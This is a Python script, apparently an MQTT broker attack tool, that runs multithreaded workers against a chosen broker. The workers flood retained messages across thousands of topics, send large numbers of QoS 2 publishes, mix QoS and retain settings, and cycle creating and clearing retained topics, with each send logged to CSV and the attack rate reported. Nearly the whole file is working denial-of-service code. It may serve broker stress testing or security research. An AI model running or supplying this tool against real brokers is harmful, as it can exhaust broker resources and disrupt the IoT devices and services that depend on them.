import argparse
import csv
import json
import os
import random
import string
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

class RetainQoSAbuse:
    def __init__(self, args):
        self.args = args
        self.stop_event = threading.Event()
        self.log_writer, self.log_handle = self._prep_log(args.log_csv)
        self.log_lock = threading.Lock()
        self.sent_count = 0
        self.retained_topics = set()
        
    @staticmethod
    def _prep_log(path):
        if not path:
            return None, None
        exists = os.path.exists(path)
        handle = open(path, "a", newline="", encoding="utf-8")
        writer = csv.writer(handle)
        if not exists:
            writer.writerow([
                "timestamp_utc", "client_id", "topic", "attack_type", 
                "qos", "retain", "payload_size", "status", "details"
            ])
        return writer, handle

    def close(self):
        if self.log_handle:
            self.log_handle.flush()
            self.log_handle.close()

    def log_attack(self, client_id, topic, attack_type, qos, retain, payload_size, status, details=""):
        if not self.log_writer:
            return
        with self.log_lock:
            self.log_writer.writerow([
                datetime.now(timezone.utc).isoformat(),
                client_id, topic, attack_type, qos, retain, payload_size, status, details
            ])

    def generate_payload(self, size_kb=1):
        size_bytes = size_kb * 1024
        return ''.join(random.choice(string.ascii_letters + string.digits) 
                      for _ in range(size_bytes))

    def retain_flood_attack(self, client, client_id):
        base_topics = [
            "retain/flood/sensor",
            "retain/flood/actuator", 
            "retain/flood/device",
            "retain/flood/system",
            "retain/flood/alert"
        ]
        
        attack_interval = 1.0 / self.args.retain_rate if self.args.retain_rate > 0 else 0.1
        
        while not self.stop_event.is_set():
            base_topic = random.choice(base_topics)
            topic = f"{base_topic}/{random.randint(1, 10000)}"
            
            payload = self.generate_payload(self.args.payload_size_kb)
            payload_data = json.dumps({
                "timestamp": datetime.now().isoformat(),
                "data": payload,
                "client": client_id,
                "attack": "retain_flood"
            })
            
            try:
                result = client.publish(topic, payload_data, qos=self.args.qos, retain=True)
                
                if result.rc == mqtt.MQTT_ERR_SUCCESS:
                    self.retained_topics.add(topic)
                    self.sent_count += 1
                    status = "sent"
                    if self.sent_count % 50 == 0:
                        print(f"[{client_id}] Retained messages: {len(self.retained_topics)}")
                else:
                    status = "failed"
                    
                self.log_attack(client_id, topic, "retain_flood", self.args.qos, True, 
                              len(payload_data), status)
                              
            except Exception as e:
                self.log_attack(client_id, topic, "retain_flood", self.args.qos, True, 
                              0, "error", str(e))
            
            time.sleep(attack_interval)

    def qos2_abuse_attack(self, client, client_id):
        topics = [f"qos2/abuse/{i}" for i in range(1, 101)]  # 100 topics
        
        attack_interval = 1.0 / self.args.qos2_rate if self.args.qos2_rate > 0 else 0.5
        
        while not self.stop_event.is_set():
            topic = random.choice(topics)
            
            payload = json.dumps({
                "timestamp": datetime.now().isoformat(),
                "qos2_message": self.generate_payload(2),  # 2KB payload
                "client": client_id,
                "attack": "qos2_abuse"
            })
            
            try:
                result = client.publish(topic, payload, qos=2, retain=False)
                
                status = "sent" if result.rc == mqtt.MQTT_ERR_SUCCESS else "failed"
                self.log_attack(client_id, topic, "qos2_abuse", 2, False, 
                              len(payload), status)
                              
                self.sent_count += 1
                if self.sent_count % 25 == 0:
                    print(f"[{client_id}] QoS2 messages sent: {self.sent_count}")
                    
            except Exception as e:
                self.log_attack(client_id, topic, "qos2_abuse", 2, False, 
                              0, "error", str(e))
            
            time.sleep(attack_interval)

    def mixed_qos_retain_attack(self, client, client_id):
        topics = self.args.topics if self.args.topics else ["mixed/attack/topic"]
        qos_levels = [0, 1, 2]
        retain_options = [True, False]
        
        attack_interval = 1.0 / self.args.mixed_rate if self.args.mixed_rate > 0 else 0.2
        
        while not self.stop_event.is_set():
            topic = random.choice(topics)
            qos = random.choice(qos_levels)
            retain = random.choice(retain_options)
            
            payload_size = random.randint(1, self.args.payload_size_kb * 2)
            payload = json.dumps({
                "timestamp": datetime.now().isoformat(),
                "data": self.generate_payload(payload_size),
                "qos": qos,
                "retain": retain,
                "client": client_id,
                "attack": "mixed_qos_retain"
            })
            
            try:
                result = client.publish(topic, payload, qos=qos, retain=retain)
                
                status = "sent" if result.rc == mqtt.MQTT_ERR_SUCCESS else "failed"
                self.log_attack(client_id, topic, "mixed_qos_retain", qos, retain, 
                              len(payload), status)
                              
                self.sent_count += 1
                
            except Exception as e:
                self.log_attack(client_id, topic, "mixed_qos_retain", qos, retain, 
                              0, "error", str(e))
            
            time.sleep(attack_interval)

    def retain_cleanup_attack(self, client, client_id):
        base_topic = "cleanup/test"
        
        while not self.stop_event.is_set():
            for i in range(20):
                topic = f"{base_topic}/{i}"
                payload = json.dumps({"data": self.generate_payload(1), "phase": "create"})
                
                client.publish(topic, payload, qos=1, retain=True)
                self.log_attack(client_id, topic, "retain_create", 1, True, len(payload), "sent")
                time.sleep(0.1)
            
            print(f"[{client_id}] Created 20 retained messages")
            time.sleep(1)
            
            for i in range(20):
                topic = f"{base_topic}/{i}"
                
                client.publish(topic, "", qos=1, retain=True)  # Empty payload clears retain
                self.log_attack(client_id, topic, "retain_clear", 1, True, 0, "sent")
                time.sleep(0.05)
            
            print(f"[{client_id}] Cleared 20 retained messages")
            time.sleep(2)

    def attack_worker(self, worker_id):
        client_id = f"{self.args.client_prefix}_{worker_id:03d}"
        client = mqtt.Client(client_id=client_id, clean_session=True)
        
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)

        connected = False
        while not connected and not self.stop_event.is_set():
            try:
                client.connect(self.args.broker, self.args.port, self.args.keepalive)
                client.loop_start()
                connected = True
                print(f"[{client_id}] Connected to {self.args.broker}:{self.args.port}")
            except Exception as e:
                print(f"[{client_id}] Connection failed: {e}, retrying in 5s")
                time.sleep(5)

        if not connected:
            return

        try:
            if worker_id % 4 == 0:
                self.retain_flood_attack(client, client_id)
            elif worker_id % 4 == 1:
                self.qos2_abuse_attack(client, client_id)
            elif worker_id % 4 == 2:
                self.mixed_qos_retain_attack(client, client_id)
            else:
                self.retain_cleanup_attack(client, client_id)
                
        except KeyboardInterrupt:
            pass
        finally:
            client.loop_stop()
            client.disconnect()
            print(f"[{client_id}] Disconnected")

    def run(self):
        print(f"Starting Retain/QoS abuse attack with {self.args.workers} workers")
        print(f"Target: {self.args.broker}:{self.args.port}")
        print(f"Attack types: retain_flood, qos2_abuse, mixed_qos_retain, retain_cleanup")
        
        threads = []
        for i in range(self.args.workers):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.5)
        
        try:
            last_count = 0
            while True:
                time.sleep(10)
                current_count = self.sent_count
                rate = (current_count - last_count) / 10
                print(f"Attack rate: {rate:.1f} msgs/sec, Total: {current_count}, Retained topics: {len(self.retained_topics)}")
                last_count = current_count
                
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.stop_event.set()
            
            for thread in threads:
                thread.join(timeout=5)
            
            print(f"Attack completed. Total messages: {self.sent_count}, Retained topics: {len(self.retained_topics)}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Retain and QoS Abuse Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--keepalive", type=int, default=60, help="Keepalive interval")
    parser.add_argument("--qos", type=int, choices=[0, 1, 2], default=1, help="Default QoS level")
    
    parser.add_argument("--topics", nargs="+", help="Target topics for mixed attack")
    parser.add_argument("--workers", type=int, default=4, help="Number of attack workers")
    
    parser.add_argument("--retain-rate", type=float, default=5.0, 
                       help="Retain flood rate (msgs/sec)")
    parser.add_argument("--qos2-rate", type=float, default=2.0, 
                       help="QoS2 abuse rate (msgs/sec)")
    parser.add_argument("--mixed-rate", type=float, default=3.0, 
                       help="Mixed attack rate (msgs/sec)")
    
    parser.add_argument("--payload-size-kb", type=int, default=5, 
                       help="Payload size in KB for retained messages")
    
    parser.add_argument("--client-prefix", default="retain_qos_attacker", 
                       help="Client ID prefix")
    
    parser.add_argument("--log-csv", help="CSV file to log attack details")
    
    args = parser.parse_args()
    
    attack = RetainQoSAbuse(args)
    try:
        attack.run()
    finally:
        attack.close()

if __name__ == "__main__":
    main()
